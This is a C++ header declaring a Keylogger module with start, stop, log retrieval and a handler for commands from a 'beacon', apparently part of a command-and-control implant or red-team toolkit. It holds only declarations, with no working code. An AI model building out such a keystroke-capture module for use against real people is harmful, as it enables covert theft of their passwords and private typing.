#pragma once
#include "../beacon.h"

namespace Keylogger {
    void Start();
    void Stop();
    void OnCommand(const Beacon::Command& cmd);
    std::string GetLogs();
    void ClearLogs();
}